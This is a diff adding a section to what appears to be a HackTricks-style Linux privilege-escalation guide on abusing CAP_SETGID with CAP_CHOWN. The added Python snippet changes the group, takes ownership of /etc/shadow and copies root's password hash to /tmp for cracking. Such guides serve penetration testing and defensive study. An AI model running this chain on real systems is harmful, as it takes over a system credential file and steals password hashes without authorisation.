@@ -1305,6 +1305,28 @@ In this case the group shadow was impersonated so you can read the file `/etc/sh
 cat /etc/shadow
 ```
 
+### Combined chain: CAP_SETGID + CAP_CHOWN
+
+When both capabilities are available in the same helper, a practical chain is:
+
+1. Switch EGID to `shadow` (or another privileged group).
+2. Use `chown` on `/etc/shadow` to set your UID while keeping group `shadow`.
+3. Read a target hash and crack/pivot.
+
+```python
+import os
+
+# Replace values with real IDs from `id` / `getent group shadow`
+LAB_UID = 1000
+SHADOW_GID = 42
+
+os.setgid(SHADOW_GID)
+os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
+os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
+```
+
+This avoids needing full root directly and is commonly enough to pivot through credential reuse.
+
 If **docker** is installed you could **impersonate** the **docker group** and abuse it to communicate with the [**docker socket** and escalate privileges](#writable-docker-socket).
 
 ## CAP_SETFCAP
@@ -1675,5 +1697,4 @@ In summary, `CAP_SETPCAP` allows a process to modify the capability sets of othe
 
 ​
 {{#include ../../banners/hacktricks-training.md}}
-
 
